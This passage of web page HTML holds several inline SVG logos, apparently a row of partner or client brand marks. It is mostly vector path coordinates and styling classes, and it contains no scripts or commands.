                  d="M84.3761 22.2412C80.4423 22.2412 77.9536 19.9049 77.9536 16.2795C77.9536 12.4124 80.2015 10.076 83.8142 10.076H84.1353C84.7775 10.076 85.4198 10.076 86.062 10.1566V5.48389H88.6311V21.7578C87.2663 22.0801 85.8212 22.2412 84.3761 22.2412ZM84.2958 12.0901C81.8071 12.0901 80.6029 13.4597 80.6029 16.1989C80.6029 18.6964 82.048 20.2271 84.4564 20.2271C84.9381 20.2271 85.4198 20.2271 86.1423 20.1466V12.2513C85.5001 12.1707 84.9381 12.0901 84.2958 12.0901ZM49.1325 21.919L42.148 9.67322V21.919H39.7395V6.45066H43.1113L50.0958 18.5353V6.45066H52.5846V21.919H49.1325ZM71.2902 22.1607C70.0057 22.1607 68.7212 21.9995 67.4367 21.7578H67.2761V19.5826L67.517 19.6632C68.6409 19.9854 69.8451 20.1466 70.9691 20.1466C71.8522 20.1466 73.9395 19.9854 73.9395 18.6964C73.9395 17.5685 72.4944 17.3268 71.3705 17.0851H71.2902L70.648 16.8434C68.962 16.4406 67.1156 15.7155 67.1156 13.4597C67.1156 11.2039 68.8818 9.99548 71.9325 9.99548C73.0564 9.99548 74.1804 10.076 75.3043 10.3177L75.7057 10.3983V12.493H75.4649C74.4212 12.2513 73.2973 12.1707 72.2536 12.0901C71.0494 12.0901 69.6043 12.3318 69.6043 13.3792C69.6043 14.2654 70.8085 14.5071 72.1733 14.8293C74.1001 15.2321 76.4282 15.7961 76.4282 18.3741C76.5085 20.7911 74.5818 22.1607 71.2902 22.1607ZM95.9367 22.1607C93.2874 22.1607 90.7987 21.6773 90.7987 18.2936C90.7987 14.5876 94.6522 14.5876 96.9001 14.5876C97.1409 14.5876 98.1846 14.6682 98.5057 14.6682C98.5057 12.5735 98.5057 12.0901 95.455 12.0901C94.2508 12.1707 92.9663 12.2513 91.7621 12.5735H91.5212V10.5594H91.6818C92.9663 10.3177 94.3311 10.1566 95.6958 10.1566C98.586 10.1566 101.075 10.4789 101.075 14.1042V21.9995H100.914C99.2282 21.9995 97.6226 22.0801 95.9367 22.1607ZM96.8198 16.36C94.6522 16.36 93.2874 16.6823 93.2874 18.2936C93.2874 20.1466 95.0536 20.3077 96.6592 20.3077C97.3015 20.3077 98.3451 20.2271 98.6663 20.2271V16.4406L96.8198 16.36ZM59.8099 22.1607C57.1606 22.1607 54.6719 21.6773 54.6719 18.2936C54.6719 14.5876 58.5254 14.5876 60.7733 14.5876C61.0142 14.5876 62.0578 14.6682 62.3789 14.6682C62.3789 12.5735 62.3789 12.0901 59.3282 12.0901C58.124 12.1707 56.8395 12.2513 55.6353 12.5735H55.3944V10.5594H55.555C56.8395 10.3177 58.2043 10.1566 59.5691 10.1566C62.4592 10.1566 64.948 10.4789 64.948 14.1042V21.9995H64.7874C63.1818 21.9995 61.4958 22.0801 59.8099 22.1607ZM60.693 16.36C58.5254 16.36 57.1606 16.6823 57.1606 18.2936C57.1606 20.1466 58.9268 20.3077 60.5325 20.3077C61.1747 20.3077 62.2184 20.2271 62.5395 20.2271V16.4406L60.693 16.36ZM111.351 27.1556V22.0801C110.709 22.1607 110.066 22.2412 109.424 22.2412C108.38 22.2412 107.337 21.9995 106.373 21.6773C104.447 20.8716 103.242 18.777 103.242 16.1184C103.242 14.7488 103.563 12.3318 105.731 11.0428C107.016 10.3177 108.541 9.99548 110.066 10.1566C110.789 10.1566 111.672 10.2372 112.555 10.2372L114 10.3177V26.0277L111.351 27.1556ZM109.825 12.0901C107.176 12.0901 105.892 13.4597 105.892 16.0378C105.892 19.4215 107.899 20.1466 109.504 20.1466C110.147 20.1466 110.789 20.066 111.351 19.9854V12.0901H109.825Z"
                  fill="currentColor"
                ></path>
              </g>
            </svg>
          </div>
          <div
            class="w-2/12 sm:-mt-10 sm:flex sm:justify-center sm:w-1/2 text-svg hover:text-btn-hover transition"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="124"
              height="124"
              viewBox="0 0 124 124"
              fill="none"
            >
              <path
                d="M56.2669 53.7275C56.3228 53.532 56.3788 53.3223 57.1758 53.3223C59.65 53.3223 60.1247 55.0412 60.1247 56.4532C60.1247 57.3056 59.6635 61.6105 55.2607 61.6105C54.6039 61.6105 54.2681 61.5269 54.2681 61.0656C54.2681 60.8418 54.4502 60.2268 54.5756 59.7655L56.2669 53.7275ZM53.7097 53.1261C54.4225 53.182 54.786 53.2521 54.786 53.7275C54.786 54.0074 54.6741 54.4403 54.6322 54.5941L52.9133 60.7723C52.676 61.6388 52.4662 61.6806 51.7811 61.8061V62.03H55.3173C59.4267 62.03 61.677 59.4439 61.677 56.6211C61.677 55.1537 60.8105 52.9028 57.5959 52.9028H53.7104V53.1261H53.7097ZM64.5693 60.5902C64.0244 61.415 63.4094 62.1837 62.6265 62.1837C61.9697 62.1837 61.9697 61.5687 61.9697 61.3172C61.9697 60.6604 63.0736 57.1936 63.0736 56.8025C63.0736 56.5092 62.9617 56.439 62.1929 56.439V56.2152C62.7243 56.1875 63.8842 55.9636 64.429 55.8659L64.4709 55.8935L63.2409 60.394C63.1849 60.5896 63.017 61.1486 63.017 61.3165C63.017 61.4143 63.1148 61.5262 63.2409 61.5262C63.4088 61.5262 63.814 61.2464 64.3872 60.4359L64.5693 60.5902ZM64.2901 54.3702C63.9408 54.3702 63.6191 54.1322 63.6191 53.6433C63.6191 53.1544 63.9408 52.8887 64.2759 52.8887C64.7372 52.8887 64.9746 53.3499 64.9746 53.6574C64.9746 53.9366 64.7507 54.3702 64.2901 54.3702ZM71.0968 60.5761C70.3982 61.5127 69.9087 62.1554 69.1541 62.1554C68.5108 62.1554 68.4831 61.736 68.4831 61.3307C68.4831 60.9955 69.5175 57.5848 69.5175 57.0257C69.5175 56.7742 69.4339 56.5786 69.1682 56.5786C68.4973 56.5786 67.6166 57.781 67.1135 58.5632C66.4709 59.5275 66.2888 60.129 65.7163 62.0293H64.6684C65.1013 60.45 66.0379 57.1795 66.0379 56.8855C66.0379 56.6758 65.8983 56.522 65.1437 56.522V56.2982C65.8983 56.1586 66.6529 56.019 67.4082 55.8652L67.45 55.8929L66.5551 58.8141L66.5828 58.8418C67.2396 57.8073 68.5256 55.8646 69.6854 55.8646C70.3287 55.8646 70.6497 56.1997 70.6497 56.7871C70.6497 57.3879 69.5317 60.8405 69.5317 61.2599C69.5317 61.4696 69.7273 61.4979 69.7556 61.4979C70.0354 61.4979 70.3847 61.0508 70.9019 60.3934L71.0968 60.5761ZM72.8859 58.5072C73.4031 57.2631 74.3532 56.1875 75.1085 56.1875C75.4578 56.1875 75.5974 56.4532 75.5974 56.7465C75.5974 56.8585 75.5279 58.5356 72.6485 59.1229L72.8859 58.5072ZM75.7646 60.506C75.066 61.0792 74.4787 61.5545 73.7241 61.5545C73.1367 61.5545 72.4105 61.2329 72.4105 60.2821C72.4105 60.0023 72.4806 59.7231 72.5501 59.4297L72.9412 59.3738C75.2056 59.0521 76.5192 57.9199 76.5192 56.816C76.5192 56.201 76.0856 55.8652 75.3729 55.8652C73.4024 55.8652 71.194 58.2133 71.194 60.212C71.194 61.0927 71.6411 62.1824 73.1091 62.1824C74.507 62.1824 75.7788 60.8965 75.9325 60.6726L75.7646 60.506ZM76.6176 62.0293L77.7498 57.9482C77.8894 57.431 77.9731 56.9563 77.9731 56.8302C77.9731 56.6346 77.9036 56.4114 77.47 56.4114C77.3163 56.4114 77.1625 56.4532 77.0088 56.4809V56.2435C77.7215 56.1457 78.5463 55.9636 79.1754 55.8659L79.2172 55.8935L78.5327 58.6751L78.5604 58.7028L78.6723 58.423C79.1336 57.5005 80.1963 55.8652 81.0763 55.8652C81.398 55.8652 81.7473 56.0749 81.7473 56.5497C81.7473 57.2766 81.2443 57.2766 81.0905 57.2766C80.4897 57.2766 80.6994 56.7736 80.3636 56.7736C79.9306 56.7736 79.0918 58.3252 78.9798 58.5349C78.4485 59.541 78.2529 60.1702 77.6797 62.0293H76.6176ZM81.0339 59.9888C81.1317 60.6038 81.3555 61.8897 82.4877 61.8897C83.27 61.8897 83.4939 61.2187 83.4939 60.7575C83.4939 59.835 81.8309 58.4931 81.8309 57.4169C81.8309 56.9839 82.0265 55.8652 83.508 55.8652C84.1372 55.8652 84.4164 56.1032 84.8358 56.1032C85.0738 56.1032 85.1574 55.9636 85.2269 55.8511H85.4225L85.1426 57.7945H84.9188C84.8493 56.9974 84.5135 56.1869 83.6052 56.1869C83.2977 56.1869 82.8506 56.3123 82.8506 56.9974C82.8506 57.8781 84.5553 59.1222 84.5553 60.3098C84.5553 61.8331 83.2552 62.1831 82.473 62.1831C82.0535 62.1831 81.4945 61.9174 81.0892 61.9174C80.8937 61.9174 80.8377 62.057 80.7541 62.2114H80.5302L80.81 59.9888H81.0339ZM96.9819 55.4882C96.9543 55.0971 96.8282 53.2238 94.8294 53.2238C92.0343 53.2238 90.6081 56.6063 90.6081 58.661C90.6081 60.4925 91.3769 61.6523 93.0404 61.6523C94.6197 61.6523 95.5982 60.6597 96.2692 60.0029L96.5065 60.1985C95.9893 60.8135 94.7452 62.2808 92.7046 62.2808C91.0829 62.2808 89.043 61.3024 89.043 58.5072C89.043 55.8099 91.5165 52.7208 94.7175 52.7208C95.7236 52.7208 96.5767 53.0559 96.8977 53.0559C97.3029 53.0559 97.3866 52.888 97.4567 52.7484H97.75L97.2328 55.5301L96.9819 55.4882ZM99.5532 60.4359C98.8404 61.5121 98.2949 62.1831 97.4284 62.1831C96.8134 62.1831 96.7574 61.7077 96.7574 61.3165C96.7574 61.0225 98.7845 53.7269 98.7845 53.4335C98.7845 53.0707 98.1971 53.0707 97.8337 53.0842V52.8604C98.5606 52.7767 99.2875 52.6507 100.014 52.4834L100.084 52.5529L97.9733 60.6456C97.9456 60.7717 97.8337 61.1486 97.8337 61.3024C97.8337 61.386 97.8337 61.5822 98.0434 61.5822C98.3927 61.5822 98.6867 61.1911 99.3711 60.3098L99.5532 60.4359ZM106.011 60.5201C105.13 61.7919 104.767 62.1554 104.068 62.1554C103.439 62.1554 103.411 61.6382 103.411 61.4285C103.411 61.1769 103.691 60.0029 104.012 58.8566H103.97C103.019 60.4359 101.986 62.1831 100.727 62.1831C100.224 62.1831 99.9585 61.9733 99.9585 61.3583C99.9585 60.7434 101.021 57.2206 101.021 56.8437C101.021 56.4384 100.755 56.4384 100.182 56.4384V56.2435C100.888 56.1582 101.588 56.0321 102.279 55.8659L102.321 55.8935L101.048 60.9672C101.006 61.1486 101.048 61.442 101.342 61.442C101.943 61.442 102.824 60.1284 103.299 59.4014C103.984 58.367 104.292 57.4863 104.837 55.9907H105.871L104.767 60.1702C104.684 60.45 104.501 61.065 104.501 61.2747C104.501 61.3442 104.515 61.4986 104.669 61.4986C104.935 61.4986 105.326 61.009 105.816 60.394L106.011 60.5201ZM111.084 57.7385C111.084 58.9125 109.757 61.862 107.841 61.862C107.185 61.862 107.185 61.4986 107.185 61.4008C107.185 59.9334 108.527 56.5503 110.064 56.5503C110.945 56.5503 111.084 57.3056 111.084 57.7385ZM107.199 53.0424C108.009 53.0566 108.107 53.1261 108.107 53.4477C108.107 53.6433 107.982 53.9926 107.884 54.3843L105.983 61.3867V61.4426C105.983 61.7501 107.059 62.1837 107.8 62.1837C109.939 62.1837 112.273 59.7655 112.273 57.5571C112.273 56.5368 111.588 55.8659 110.61 55.8659C109.352 55.8659 108.471 57.166 108.01 57.8923L107.982 57.8787C108.458 56.2988 109.1 53.6992 109.408 52.5535L109.338 52.484C108.611 52.6236 107.899 52.7214 107.2 52.8057V53.0424H107.199ZM51.7856 72.6971C52.4707 72.571 52.6805 72.5292 52.9178 71.6627L54.6367 65.4845C54.7204 65.2046 54.7905 64.8695 54.7905 64.6179C54.7905 64.129 54.4135 64.0872 53.812 64.0171V63.7932H57.2646V64.0171C56.5801 64.1432 56.3563 64.1708 56.1183 65.0515L54.3994 71.2433C54.3157 71.5231 54.2456 71.8023 54.2456 72.1381C54.2456 72.5852 54.5949 72.6277 55.1964 72.6971V72.921H51.7856V72.6971Z"
                fill="currentColor"
              ></path>
              <path
                d="M61.9189 71.4675C61.2197 72.4041 60.7308 73.0474 59.9755 73.0474C59.3329 73.0474 59.3046 72.628 59.3046 72.2227C59.3046 71.8876 60.339 68.4768 60.339 67.9178C60.339 67.6662 60.2554 67.4707 59.9897 67.4707C59.3187 67.4707 58.438 68.673 57.935 69.4553C57.2917 70.4196 57.1103 71.0204 56.5371 72.9214H55.4891C55.9221 71.3421 56.8587 68.0709 56.8587 67.7775C56.8587 67.5678 56.7191 67.4141 55.9645 67.4141V67.1902C56.7191 67.0506 57.4737 66.9104 58.229 66.7566L58.2708 66.7849L57.3766 69.7061L57.4042 69.7344C58.0611 68.7 59.347 66.7572 60.5069 66.7572C61.1502 66.7572 61.4718 67.093 61.4718 67.6804C61.4718 68.2812 60.3538 71.7338 60.3538 72.1533C60.3538 72.363 60.5493 72.3906 60.5776 72.3906C60.8575 72.3906 61.2068 71.9435 61.7234 71.2867L61.9189 71.4675ZM65.6507 67.3857H64.4767L63.2467 72.04C63.2326 72.0818 63.2326 72.1095 63.2326 72.152C63.2326 72.2774 63.302 72.3893 63.4564 72.3893C63.7363 72.3893 64.2252 71.7325 64.5745 71.2854L64.7559 71.3832C64.0431 72.4595 63.4982 73.0745 62.7713 73.0745C62.4915 73.0745 62.1003 72.9349 62.1003 72.5154C62.1003 72.3057 62.366 71.4533 62.422 71.2295L63.4281 67.3857H62.3937C62.3802 67.3021 62.3802 67.232 62.422 67.1619C62.5056 67.0358 62.8967 66.938 63.1348 66.8126C63.596 66.5745 64.267 65.946 64.6581 65.4565C64.7141 65.387 64.77 65.2609 64.8955 65.2892C64.9933 65.2609 65.0216 65.387 64.9933 65.4989L64.6021 66.9387H65.7202L65.6507 67.3857ZM66.8942 69.3986C67.4114 68.1545 68.3622 67.0783 69.1168 67.0783C69.4661 67.0783 69.6064 67.3439 69.6064 67.6373C69.6064 67.7492 69.5363 69.4263 66.6575 70.0136L66.8942 69.3986ZM69.7736 71.3974C69.075 71.9706 68.4877 72.4453 67.7331 72.4453C67.1458 72.4453 66.4195 72.1237 66.4195 71.1735C66.4195 70.8937 66.4889 70.6145 66.5591 70.3211L66.9502 70.2652C69.2146 69.9435 70.5282 68.8113 70.5282 67.7068C70.5282 67.0918 70.0947 66.756 69.3819 66.756C67.4114 66.756 65.2023 69.104 65.2023 71.1027C65.2023 71.9834 65.6494 73.0732 67.1175 73.0732C68.5153 73.0732 69.7872 71.7872 69.9409 71.564L69.7736 71.3974ZM70.9059 72.9207L72.0381 68.8396C72.1777 68.3224 72.2619 67.847 72.2619 67.7216C72.2619 67.526 72.1918 67.3021 71.7589 67.3021C71.6051 67.3021 71.4514 67.3439 71.2976 67.3722V67.1342C72.0104 67.0364 72.8351 66.8544 73.4643 66.7566L73.5061 66.7849L72.8216 69.5665L72.8493 69.5942L72.9612 69.3144C73.4225 68.3919 74.4845 66.756 75.3652 66.756C75.6869 66.756 76.0362 66.9657 76.0362 67.4411C76.0362 68.168 75.5331 68.168 75.3794 68.168C74.7785 68.168 74.9882 67.6649 74.6531 67.6649C74.2195 67.6649 73.3806 69.2166 73.2693 69.4263C72.738 70.4324 72.5424 71.0616 71.9692 72.9207H70.9059Z"
                fill="currentColor"
              ></path>
              <path
                d="M81.64 71.4673C80.9414 72.404 80.4519 73.0473 79.6973 73.0473C79.0539 73.0473 79.0263 72.6278 79.0263 72.2225C79.0263 71.8874 80.0607 68.4766 80.0607 67.9175C80.0607 67.666 79.9771 67.4704 79.7114 67.4704C79.0411 67.4704 78.1597 68.6728 77.6567 69.455C77.014 70.4194 76.832 71.0202 76.2588 72.9212H75.2108C75.6444 71.3419 76.5804 68.0706 76.5804 67.7773C76.5804 67.5676 76.4408 67.4138 75.6856 67.4138V67.1899C76.4402 67.0503 77.1954 66.9101 77.95 66.7563L77.9918 66.7847L77.097 69.7059L77.1247 69.7342C77.7815 68.6998 79.0675 66.757 80.228 66.757C80.8713 66.757 81.1923 67.0928 81.1923 67.6801C81.1923 68.281 80.0742 71.7336 80.0742 72.1531C80.0742 72.3628 80.2698 72.3905 80.2981 72.3905C80.5779 72.3905 80.9273 71.9434 81.4445 71.2865L81.64 71.4673Z"
                fill="currentColor"
              ></path>
              <path
                d="M82.7163 71.3971C82.7163 70.1388 83.9746 67.0645 85.6099 67.0645C86.0151 67.0645 86.4069 67.3301 86.4069 68.0011C86.4069 69.3707 85.0373 72.3897 83.5552 72.3897C83.1776 72.3897 82.7163 72.1382 82.7163 71.3971ZM87.79 71.3829C87.1609 71.9979 86.881 72.3479 86.6719 72.3479C86.56 72.3479 86.4764 72.2642 86.4764 72.1658C86.4764 71.7329 87.7623 66.966 87.8042 66.7988L87.7064 66.757L86.854 66.8548L86.8122 66.8966L86.6726 67.5122H86.6449C86.6031 67.1204 86.1419 66.757 85.541 66.757C83.6819 66.757 81.5436 69.3707 81.5436 71.4254C81.5436 71.8307 81.5854 73.0742 82.9833 73.0742C83.8221 73.0742 84.5626 72.6547 85.7224 70.95L85.7501 70.9776C85.5262 71.83 85.4568 72.1375 85.4568 72.4592C85.4568 72.6965 85.4568 73.06 86.0441 73.06C86.6449 73.06 87.1203 72.5569 87.9592 71.5225L87.79 71.3829ZM91.9412 67.3855H90.7672L89.5372 72.0397C89.5231 72.0815 89.5231 72.1092 89.5231 72.1517C89.5231 72.2771 89.5932 72.389 89.7469 72.389C90.0268 72.389 90.5157 71.7322 90.865 71.2851L91.0464 71.3829C90.3336 72.4592 89.7887 73.0742 89.0618 73.0742C88.782 73.0742 88.3908 72.9346 88.3908 72.5151C88.3908 72.3054 88.6565 71.453 88.7125 71.2292L89.7186 67.3855H88.6842C88.6707 67.3018 88.6707 67.2317 88.7125 67.1616C88.7961 67.0355 89.1872 66.9377 89.4253 66.8123C89.8865 66.5743 90.5575 65.9458 90.9486 65.4562C91.0046 65.3867 91.0605 65.2607 91.1866 65.289C91.2844 65.2607 91.3121 65.3867 91.2844 65.4987L90.8933 66.9384H92.0113L91.9412 67.3855ZM94.6251 71.4813C94.0795 72.3061 93.4652 73.0748 92.6823 73.0748C92.0255 73.0748 92.0255 72.4598 92.0255 72.2083C92.0255 71.5515 93.1294 68.0854 93.1294 67.6936C93.1294 67.3996 93.0174 67.3301 92.2487 67.3301V67.1063C92.7794 67.0786 93.9393 66.8548 94.4848 66.757L94.5266 66.7853L93.2966 71.2858C93.2407 71.4813 93.0728 72.0404 93.0728 72.2083C93.0728 72.3061 93.1706 72.418 93.2966 72.418C93.4645 72.418 93.8698 72.1382 94.4424 71.3276L94.6251 71.4813ZM94.3452 65.2613C93.9959 65.2613 93.6743 65.0239 93.6743 64.5344C93.6743 64.0455 93.9959 63.7798 94.3311 63.7798C94.7923 63.7798 95.0297 64.241 95.0297 64.5485C95.0303 64.8277 94.8065 65.2613 94.3452 65.2613ZM99.1957 67.0503C99.866 67.0503 100.174 67.6653 100.174 68.3922C100.174 69.8879 99.0702 72.7808 97.4768 72.7808C96.7782 72.7808 96.3587 72.2777 96.3587 71.4807C96.3581 69.8319 97.6299 67.0503 99.1957 67.0503ZM99.2935 66.7563C97.2529 66.7563 95.1841 69.0072 95.1841 71.0613C95.1841 72.2211 95.8132 73.0735 97.2947 73.0735C99.4331 73.0735 101.348 70.5441 101.348 68.8245C101.348 67.9027 100.915 66.7563 99.2935 66.7563Z"
                fill="currentColor"
              ></path>
              <path
                d="M107.442 71.4676C106.743 72.4043 106.254 73.0476 105.499 73.0476C104.856 73.0476 104.828 72.6282 104.828 72.2229C104.828 71.8877 105.863 68.4769 105.863 67.9179C105.863 67.6664 105.779 67.4708 105.513 67.4708C104.843 67.4708 103.962 68.6731 103.459 69.4554C102.815 70.4197 102.634 71.0206 102.061 72.9215H101.013C101.447 71.3422 102.383 68.071 102.383 67.7777C102.383 67.5679 102.243 67.4142 101.488 67.4142V67.1903C102.242 67.0507 102.998 66.9105 103.752 66.7567L103.794 66.785L102.899 69.7063L102.927 69.7346C103.584 68.7002 104.87 66.7574 106.03 66.7574C106.673 66.7574 106.994 67.0932 106.994 67.6805C106.994 68.2814 105.876 71.734 105.876 72.1534C105.876 72.3631 106.072 72.3908 106.1 72.3908C106.38 72.3908 106.729 71.9437 107.247 71.2869L107.442 71.4676ZM108.798 71.3975C108.798 70.1392 110.056 67.0649 111.691 67.0649C112.096 67.0649 112.488 67.3306 112.488 68.0015C112.488 69.3711 111.118 72.3901 109.636 72.3901C109.259 72.3901 108.798 72.1386 108.798 71.3975ZM113.871 71.3834C113.242 71.9984 112.962 72.3483 112.753 72.3483C112.641 72.3483 112.558 72.2647 112.558 72.1663C112.558 71.7333 113.844 66.9665 113.885 66.7992L113.788 66.7574L112.935 66.8552L112.893 66.897L112.753 67.5126H112.726C112.684 67.1208 112.222 66.7574 111.622 66.7574C109.762 66.7574 107.624 69.3711 107.624 71.4258C107.624 71.8311 107.666 73.0746 109.064 73.0746C109.902 73.0746 110.643 72.6552 111.803 70.9504L111.831 70.9781C111.607 71.8305 111.537 72.138 111.537 72.4596C111.537 72.697 111.537 73.0605 112.124 73.0605C112.726 73.0605 113.2 72.5574 114.039 71.523L113.871 71.3834ZM117.044 71.3274C116.331 72.4036 115.786 73.0746 114.92 73.0746C114.305 73.0746 114.249 72.5999 114.249 72.2081C114.249 71.9147 116.275 64.6184 116.275 64.3251C116.275 63.9616 115.688 63.9616 115.324 63.9757V63.7519C116.058 63.667 116.786 63.5409 117.505 63.3743L117.575 63.4444L115.464 71.5371C115.436 71.6626 115.324 72.0402 115.324 72.1939C115.324 72.2776 115.324 72.4738 115.534 72.4738C115.883 72.4738 116.177 72.0826 116.862 71.202L117.044 71.3274ZM119.004 63.6895H119.148C119.281 63.6895 119.389 63.7557 119.389 63.9552C119.389 64.1404 119.323 64.2729 119.151 64.2729H119.004V63.6895ZM118.613 63.6753C118.784 63.6927 118.781 63.6895 118.781 63.8432V64.6782C118.781 64.8281 118.784 64.8281 118.613 64.8461V64.8982H119.172V64.8461C118.998 64.8288 119.004 64.8288 119.004 64.6782V64.336H119.168C119.388 64.6609 119.476 64.8982 119.588 64.8982H119.808V64.8667C119.741 64.8178 119.637 64.6995 119.546 64.5734L119.346 64.3006C119.504 64.2485 119.622 64.1153 119.622 63.9378C119.622 63.721 119.43 63.6232 119.224 63.6232H118.612V63.6753H118.613ZM120.353 64.28C120.353 63.6193 119.84 63.0815 119.175 63.0815C119.018 63.0811 118.862 63.1119 118.717 63.172C118.572 63.2322 118.44 63.3206 118.329 63.432C118.219 63.5435 118.131 63.6759 118.072 63.8214C118.012 63.967 117.983 64.1229 117.984 64.28C117.984 64.94 118.505 65.4714 119.175 65.4714C119.84 65.4714 120.353 64.94 120.353 64.28ZM120.161 64.28C120.161 64.8352 119.724 65.3247 119.175 65.3247C118.616 65.3247 118.176 64.8352 118.176 64.28C118.176 63.7242 118.613 63.2282 119.175 63.2282C119.728 63.2282 120.161 63.721 120.161 64.28Z"
                fill="currentColor"
              ></path>
              <path
                d="M34.4191 76.6048C42.4147 76.644 48.9712 70.0868 48.9153 62.1086C48.9706 53.9123 42.4147 47.3558 34.4191 47.3584H18.3977C10.3063 47.3565 3.74978 53.9123 3.64685 62.1086C3.74978 70.0868 10.3063 76.6434 18.3971 76.6048H34.4191Z"
                fill="currentColor"
              ></path>
              <path
                d="M4.66455 62.1086C4.74432 54.4617 10.855 48.3503 18.3977 48.3761C25.9321 48.3503 32.0434 54.4617 32.1303 62.1093C32.0434 69.5387 25.9321 75.6501 18.3977 75.5877C10.855 75.6501 4.74432 69.5381 4.66455 62.1086Z"
                fill="#EFF6FE"
              ></path>
              <path
                d="M15.3453 53.9707C12.1847 55.3969 9.81353 58.4461 9.75049 62.1085C9.81353 65.6331 12.0715 68.7377 15.3453 69.9921V53.9707ZM21.4489 69.9928C24.715 68.7383 26.9723 65.6331 27.0437 62.1091C26.9723 58.3677 24.7143 55.2625 21.4489 53.9713V69.9928Z"
                fill="currentColor"
              ></path>
            </svg>
          </div>
          <div
            class="w-2/12 sm:-mt-10 sm:flex sm:justify-center sm:w-1/2 text-svg hover:text-btn-hover transition"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="128"
              height="128"
              viewBox="0 0 128 128"
              fill="none"
            >
              <path
                fill-rule="evenodd"
                clip-rule="evenodd"
                d="M97.2657 86.1168H98.0532V82.0455H95.1633V82.8988H97.0685V83.4905C97.0685 84.7383 96.2796 85.4607 95.0325 85.4607C93.5875 85.4607 92.6678 84.213 92.6678 81.9134C92.6678 79.6815 93.5211 78.4337 95.0325 78.4337C96.0166 78.4337 96.6747 79.0241 97.0027 80.2718L97.9224 80.0746C97.4622 78.4337 96.5425 77.6455 95.0325 77.6455C92.9965 77.6455 91.7487 79.2213 91.7487 81.9798C91.7487 84.6725 92.9965 86.2483 95.0325 86.2483C95.9522 86.2483 96.6747 85.9203 97.1999 85.1978L97.2657 86.1168ZM100.286 86.1168H101.139V82.768C101.467 81.5203 102.125 80.8628 102.979 80.8628H103.045V80.0095H102.848C102.059 80.0095 101.534 80.4684 101.14 81.4545V80.0746H100.286V86.1168H100.286ZM103.965 83.0961C103.965 85.132 104.884 86.2476 106.46 86.2476C108.036 86.2476 108.956 85.132 108.956 83.0961C108.956 81.0601 108.036 79.9431 106.46 79.9431C104.884 79.9431 103.965 81.0594 103.965 83.0961ZM104.818 83.0961C104.818 81.5203 105.41 80.6656 106.46 80.6656C107.511 80.6656 108.102 81.5203 108.102 83.0961C108.102 84.6719 107.511 85.5252 106.46 85.5252C105.41 85.5252 104.818 84.6719 104.818 83.0961ZM115.062 80.0739H114.275V84.6068C113.683 85.1971 113.158 85.5252 112.567 85.5252C111.844 85.5252 111.583 85.132 111.583 84.2774V80.0739H110.728V84.541C110.728 85.658 111.32 86.2476 112.305 86.2476C113.028 86.2476 113.684 85.9196 114.34 85.1971V86.1168H115.062V80.0739ZM117.493 88.35H118.282V85.4601C118.675 85.9854 119.202 86.2476 119.858 86.2476C121.5 86.2476 122.354 85.132 122.354 83.1625C122.354 81.1265 121.434 79.9431 119.858 79.9431C119.136 79.9431 118.675 80.2712 118.282 80.7964L118.085 80.0739H117.493V88.35ZM118.282 84.6068V81.5847C118.675 80.993 119.201 80.665 119.857 80.665C120.974 80.665 121.5 81.5196 121.5 83.1618C121.5 84.7376 120.908 85.5252 119.924 85.5252C119.266 85.5252 118.74 85.2629 118.282 84.6068ZM5.64709 77.7106H7.61734C8.73361 77.7106 9.58758 77.8414 10.2443 78.3667C11.164 79.0892 11.7544 80.2705 11.7544 81.9127C11.7544 84.6712 10.3094 86.1162 7.42011 86.1162H5.64709V77.7106ZM6.56681 78.4981V85.2635H7.2893C8.34049 85.2635 9.12806 85.1971 9.71973 84.6719C10.4422 84.1466 10.836 83.1625 10.836 81.9134C10.836 80.5348 10.4422 79.6151 9.71973 79.0234C9.06298 78.5646 8.34049 78.4981 7.42078 78.4981H6.56681ZM18.1253 84.8027C17.5994 85.7224 16.8111 86.1826 15.6955 86.1826C14.1191 86.1826 13.2651 85.132 13.2651 83.0296C13.2651 81.0594 14.1841 79.9431 15.6298 79.9431C17.0748 79.9431 17.9945 80.9937 17.9945 82.9652V83.2275H14.1197V83.4248C14.1197 84.7389 14.7765 85.4607 15.7619 85.4607C16.4844 85.4607 17.1412 85.1327 17.4692 84.4102L18.1253 84.8027ZM17.0748 82.5044C17.0748 81.323 16.4838 80.665 15.6298 80.665C14.7107 80.665 14.1848 81.3224 14.1191 82.5044H17.0748ZM24.0367 86.1168H23.3142V85.1971C22.6574 85.8545 22 86.1826 21.2782 86.1826C20.2934 86.1826 19.7018 85.5909 19.7018 84.5404V80.0089H20.5557V84.2123C20.5557 85.0656 20.8187 85.4601 21.5405 85.4601C22.1322 85.4601 22.6574 85.1971 23.2485 84.5404V80.0089H24.0367V86.1168ZM28.8311 86.0504C28.5024 86.1826 28.2401 86.1826 27.9114 86.1826C26.9917 86.1826 26.5322 85.7881 26.5322 84.9999V80.7314H25.6125V80.0089H26.5322V78.0386H27.3862V80.0089H28.7654V80.7314H27.3862V84.6719C27.3862 85.2635 27.5176 85.4607 28.2401 85.4607C28.4367 85.4607 28.6339 85.3943 28.8311 85.3943V86.0504ZM30.2755 84.541C30.8014 85.1971 31.3267 85.5252 32.0485 85.5252C32.7703 85.5252 33.2305 85.0663 33.2305 84.4746C33.2305 83.6871 32.5737 83.6213 31.3917 83.2269C30.3405 82.9646 29.8153 82.3736 29.8153 81.5847C29.8153 80.6005 30.6035 79.9425 31.654 79.9425C32.5737 79.9425 33.2962 80.2705 33.8872 80.9279L33.2962 81.5196C32.8367 80.9279 32.3108 80.5999 31.7198 80.5999C31.1281 80.5999 30.735 80.993 30.735 81.5196C30.735 81.7819 30.8007 81.9785 30.9973 82.1099C31.3917 82.438 31.9827 82.5044 32.6395 82.7016C33.6243 83.0296 34.0845 83.5549 34.0845 84.4095C34.0845 85.4601 33.2962 86.1826 31.917 86.1826C30.9973 86.1826 30.144 85.7881 29.6187 85.0656L30.2755 84.541ZM37.7626 86.1826C36.1862 86.1826 35.2671 85.132 35.2671 83.0296C35.2671 81.0594 36.2526 79.9431 37.7626 79.9431C38.8138 79.9431 39.6021 80.5348 39.9301 81.5203L39.0761 81.8483C38.8796 81.0594 38.3543 80.6656 37.6969 80.6656C36.7121 80.6656 36.1862 81.4545 36.1862 83.0303C36.1862 84.6725 36.7121 85.4607 37.7626 85.4607C38.4194 85.4607 38.9447 85.0663 39.3391 84.2781L40.0616 84.6725C39.5357 85.7224 38.8132 86.1826 37.7626 86.1826ZM41.7031 77.7106H42.4914V80.9286C43.2138 80.2061 43.8048 79.9431 44.5931 79.9431C45.6436 79.9431 46.2353 80.5348 46.2353 